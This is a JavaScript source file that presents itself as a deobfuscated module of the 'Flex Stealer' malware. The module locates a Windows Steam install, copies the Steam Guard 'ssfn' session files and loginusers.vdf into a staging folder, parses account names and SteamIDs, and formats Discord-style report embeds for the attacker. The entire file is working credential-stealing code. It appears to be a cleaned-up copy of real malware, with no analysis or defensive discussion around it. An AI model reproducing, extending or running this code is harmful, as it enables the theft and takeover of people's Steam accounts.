/**
 * Deobfuscated and Refactored Steam Stealer Module
 * Part of "Flex Stealer | 2026"
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

/**
 * Extracts Steam account information from loginusers.vdf
 * @param {string} vdfContent 
 * @returns {Array} List of account objects
 */
function parseLoginUsersVdf(vdfContent) {
    const accounts = [];
    const lines = vdfContent.split("\n");
    let currentAccount = null;

    for (const line of lines) {
        const trimmed = line.trim();
        // SteamID is usually a 17-digit number in quotes
        if (/^"\d{17}"/.test(trimmed)) {
            const steamId = trimmed.replace(/"/g, "");
            currentAccount = { steamId };
            accounts.push(currentAccount);
        } else if (currentAccount && trimmed.startsWith("\"PersonaName\"")) {
            const parts = trimmed.split("\"");
            if (parts.length >= 4) {
                currentAccount.personaName = parts[3];
            }
        } else if (currentAccount && trimmed.startsWith("\"AccountName\"")) {
            const parts = trimmed.split("\"");
            if (parts.length >= 4) {
                currentAccount.accountName = parts[3];
            }
        }
    }
    return accounts;
}

/**
 * Main Stealer Logic
 */
async function stealSteamData(destinationDir) {
    // 1. Locate Steam
    // Heuristic: Check for common Steam install paths or registry (simplified here)
    // The obfuscated script likely used more complex logic to find the path.
    const possiblePaths = [
        "C:\\Program Files (x86)\\Steam",
        "C:\\Program Files\\Steam"
    ];
    
    let steamPath = null;
    for (const p of possiblePaths) {
        if (fs.existsSync(p)) {
            steamPath = p;
            break;
        }
    }

    if (!steamPath || !fs.existsSync(steamPath)) {
        return undefined;
    }

    const configPath = path.join(steamPath, "config");
    const targetDir = path.join(destinationDir, "Games\\Steam");
    
    if (!fs.existsSync(targetDir)) {
        fs.mkdirSync(targetDir, { recursive: true });
    }

    let accountsFound = [];
    let success = false;

    // 2. Collect sensitive files
    try {
        const files = fs.readdirSync(steamPath);
        for (const file of files) {
            // Steam Guard files starts with 'ssfn'
            if (file.startsWith("ssfn")) {
                const src = path.join(steamPath, file);
                const dest = path.join(targetDir, file);
                fs.copyFileSync(src, dest);
                success = true;
            }
        }

        // Collect config files (contains loginusers.vdf)
        if (fs.existsSync(configPath)) {
            const configFiles = fs.readdirSync(configPath);
            for (const file of configFiles) {
                if (file === "loginusers.vdf") {
                    const src = path.join(configPath, file);
                    const dest = path.join(targetDir, file);
                    fs.copyFileSync(src, dest);
                    
                    const content = fs.readFileSync(src, "utf8");
                    accountsFound = parseLoginUsersVdf(content);
                    success = true;
                }
            }
        }
    } catch (err) {
        // Silently fail or log to telemetry (omitted)
    }

    if (!success) return undefined;

    // 3. Prepare Report Embeds
    const embeds = [];
    for (const acc of accountsFound) {
        embeds.push({
            title: `Steam Account - ${acc.accountName || "Unknown"}`,
            url: `https://steamcommunity.com/profiles/${acc.steamId || ""}`,
            color: 0xffffff,
            description: `**Bilgisayarda Steam oturumu tespit edildi.**\n[Click here to view Profile](https://steamcommunity.com/profiles/${acc.steamId || ""})\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n**Detaylar**\n\`\`\`ini\n[Kullanici]: ${acc.accountName || "Unknown"}\n[SteamID]: ${acc.steamId || "Unknown"}\n[Level]: Private\n[Games]: Private\n\`\`\``,
            footer: {
                text: "Flex Stealer | 2026",
                icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png"
            },
            timestamp: new Date().toISOString()
        });
    }

    return {
        embeds: embeds,
        collectedFiles: targetDir
    };
}

module.exports = {
    run: stealSteamData
};